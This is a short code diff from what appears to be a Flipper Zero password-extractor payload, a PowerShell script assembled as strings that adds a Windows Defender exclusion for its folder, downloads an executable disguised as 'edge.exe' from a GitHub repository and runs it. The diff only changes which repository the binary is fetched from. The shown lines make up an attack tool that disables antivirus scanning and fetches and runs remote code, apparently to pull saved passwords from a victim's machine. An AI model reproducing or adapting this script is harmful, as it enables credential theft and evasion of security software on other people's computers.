@@ -13,7 +13,7 @@ let script = [
     "Add-MpPreference -ExclusionPath $currentDirectory.Path;",
     "$Date = Get-Date -Format yyyy-MM-dd;",//Get Date
 	"$Time = Get-Date -Format hh-mm-ss;",//Get Time
-    "$exeUrl = 'https://github.com/RiadZX/FlipperPasswordExtractor/raw/master/build/edge.exe';", // URL of the executable
+    "$exeUrl = 'https://github.com/nmac101/FlipperPasswordExtractor/raw/master/build/edge.exe';", // URL of the executable
     "$exePath = '.\\edge.exe';", // Path where the executable will be saved in the current directory
     "if (-not (Test-Path -Path $exePath)) {Invoke-WebRequest -Uri $exeUrl -OutFile $exePath;}", // Download the executable if it doesn't exist
     "$commandOutput = & \"$exePath\" | Out-String;", // Execute the command and capture the output
